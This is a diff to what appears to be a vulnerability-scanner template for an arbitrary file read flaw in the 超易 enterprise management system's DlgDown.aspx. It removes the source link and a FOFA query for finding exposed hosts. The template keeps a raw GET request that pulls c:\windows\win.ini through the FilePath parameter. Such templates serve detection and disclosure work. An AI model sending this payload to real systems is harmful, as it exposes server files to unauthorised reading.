@@ -3,12 +3,8 @@ info:
   name: 超易企业管理系统DlgDown.aspx存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/euc6iv68514thxga'
+  description: ''
   tags: lfi,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: euc6iv68514thxga
-    fofa: body="超易企业管理系统"&&body="超易软件"
 http:
 - raw:
   - 'GET /DlgDown.aspx?FileName=1.txt&FilePath=c:\windows\win.ini HTTP/1.1
